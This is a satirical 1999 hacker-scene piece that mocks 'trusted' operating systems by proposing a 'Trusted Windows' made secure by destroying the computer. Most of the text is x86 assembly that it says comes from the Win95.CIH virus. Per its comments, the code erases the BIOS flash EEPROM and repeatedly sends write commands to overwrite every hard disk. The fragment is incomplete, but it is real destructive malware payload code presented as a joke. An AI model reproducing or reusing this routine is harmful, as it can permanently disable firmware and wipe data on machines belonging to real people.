Description of a Proposed Trusted Operating System by Wyzewun and Pneuma
Drawn up Tuesday, 31st August 1999

Abstract: Trusted Windows (Code Name: Gibson) will be based on the popular
          Microsoft Windows Operating System, and will essentially be the same
          Operating System, only it will have military grade security.

Proposed Liscence Agreement: If we were to be Open source, people would see 
                             that we code like two year olds, and thus perhaps
                             be able to spot flaws in our code. For this
                             reason we will not be Open Source.

                             Also, rather than making our Operating System a
                             retail product, we will make it completely
                             illegal to use or possess. This will increase
                             security and lessen chances of people finding
			     bugs and loopholes.

Details: The Operating System will be small and elegant, and has had all of 
	 the security holes in Windows removed. At the moment, the Operating
         System consists of the following code...

; Trusted Windows v1.0 (Code Name: Gibson) by Wyzewun and Marc Satur9
; Super Hardcore secure Windows variant

; Kill BIOS EEPROM

			mov	bp, 0cf8h
			lea	esi, IOForEEPROM-@7[esi]

; Show BIOS Page in 000E0000 - 000EFFFF (64kb)

			mov	edi, 8000384ch
			mov	dx, 0cfeh
			cli
			call	esi

; Show BIOS Page in 000F0000 - 000FFFFF (64kb)

			mov	di, 0058h
                        dec     edx
                        mov     word ptr (BooleanCalculateCode-@10)[esi], 0f24h
			call	esi

; Show the BIOS Extra ROM Data in Memory (000E0000 - 000E01FF) (512 bytes)
; The Section of Extra BIOS can be Writted... 

			lea	ebx, EnableEEPROMToWrite-@10[esi]

			mov	eax, 0e5555h
			mov	ecx, 0e2aaah
			call	ebx
			mov	byte ptr [eax], 60h

			push	ecx
			loop	$

; Kill the BIOS Extra ROM Data in Memory (000E0000 - 000E007F) (80h Bytes)

			xor	ah, ah
			mov	[eax], al

			xchg	ecx, eax
			loop	$

; Show and Enable the BIOS Main ROM Data (000E0000 - 000FFFFF) (128kb)
; Can be written

			mov	eax, 0f5555h
			pop	ecx
			mov	ch, 0aah
			call	ebx
			mov	byte ptr [eax], 20h

			loop	$

; Kill the BIOS Main ROM Data in Memory (000FE000 - 000FE07F) (80h bytes)

			mov	ah, 0e0h
			mov	[eax], al

; Hide BIOS Page in 000F0000 - 000FFFFF (64kb)
                                                                        
			mov	word ptr (BooleanCalculateCode-@10)[esi], 100ch
			call	esi

; Kill HardDrive

KillHardDisk:
			xor	ebx, ebx
			mov	bh, FirstKillHardDiskNumber
			push	ebx
			sub	esp, 2ch
			push	0c0001000h
			mov	bh, 08h
			push	ebx
			push	ecx
			push	ecx
			push	ecx
			push	40000501h
			inc	ecx
			push	ecx
			push	ecx

			mov	esi, esp
			sub	esp, 0ach

LoopOfKillHardDisk:
			int	20h
			dd	00100004h	; VXDCall IOS_SendCommand

			cmp	word ptr [esi+06h], 0017h
			je	KillNextDataSection

ChangeNextHardDisk:
			inc	byte ptr [esi+4dh]

			jmp	LoopOfKillHardDisk

KillNextDataSection:
			add	dword ptr [esi+10h], ebx
			mov	byte ptr [esi+4dh], FirstKillHardDiskNumber

			jmp	LoopOfKillHardDisk

As you can see, this code was borrowed from the extremely popular addon pack
for Microsoft Windows - the Win95.CIH Virus. It succeeds in removing the BIOS
and the ability of the hard-drive to boot, two of the most common ways to
access your Windows workstation and thus be able to hack it.

Conclusion: Well, this is a revolutionary step in the field of Computer
            Security which the world may not be ready for, but we are
            confident that Trusted Windows is the only way to have a truly
            secure Windows box and highly recommend that you employ it if you
            wish to be secure. Only you can't have it. Giving it to you would
 	    be a security threat. Sorry.
